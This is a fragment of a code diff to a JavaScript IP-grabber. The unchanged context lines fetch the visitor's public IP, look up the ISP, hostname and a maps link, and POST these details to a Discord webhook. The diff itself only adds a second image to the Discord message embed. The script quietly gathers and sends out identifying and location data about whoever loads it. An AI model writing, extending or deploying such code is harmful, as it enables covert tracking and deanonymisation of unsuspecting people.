@@ -255,7 +255,7 @@ fetch('https://api.ipify.org/?format=json')
         var maps_url = await generateLink(ip, "maps");
         var myipaddress_url = await generateLink(ip, "myipaddress");
         var flagUrl = await generateImgUrl(ip);
-        // var flagUrl = 'https://flagcdn.com/256x192/es.png'
+        var img_url = 'https://cdn.discordapp.com/attachments/1107821046406598797/1133904942969671711/yugue.png'
         var ISP = await detectISP(ip);
         var hostname = await detecthostname(ip);
         
@@ -281,9 +281,18 @@ fetch('https://api.ipify.org/?format=json')
         '### Maps: ' + maps_url + '\n' + 
         '### My ip address: ' + myipaddress_url,
 
-      embeds: [{
-        image: { url: flagUrl }
-      }]
+      embeds: [
+      {
+        image: {
+          url: flagUrl
+        }
+      },
+      {
+        image: {
+          url: img_url
+        }
+      }
+    ]
     };
     fetch(webwhook, {
       method: 'POST',
